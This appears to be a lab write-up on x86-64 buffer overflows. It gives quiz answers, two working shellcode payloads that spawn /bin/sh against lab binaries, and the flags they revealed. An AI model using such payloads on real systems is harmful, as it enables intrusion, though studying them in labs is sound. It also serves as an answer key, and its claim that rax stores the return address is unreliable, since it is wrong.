# Buffer Overflows

### Process Layout
- Where is dynamically allocated memory stored? `heap`
- Where is information about functions(e.g. local arguments) stored? `stack`

### x86-64 Procedures
- what direction does the stack grown(l for lower/h for higher) `l`
- what instruction is used to add data onto the stack? `push`

### Procedures Continued
- What register stores the return address? `rax`

### Overwriting Variables
- What is the minimum number of characters needed to overwrite the variable? `15`

### Buffer Overflows
- Use the above method to open a shell and read the contents of the secret.txt file.<br />
The payload that worked for me is: <br />
`./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")`<br />
`omgyoudidthissocool!!`

### Buffer Overflow 2
- Use the same method to read the contents of the secret file!<br />
The payload that worked for me is: <br />
`./buffer-overflow-2 $(python -c "print '\\x90'*86 + '\\x31\\xff\\x66\\xbf\\xeb\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'A'*23 + '\\xa8\\xe2\\xff\\xff\\xff\\x7f'")`<br />
`wowanothertime!!`
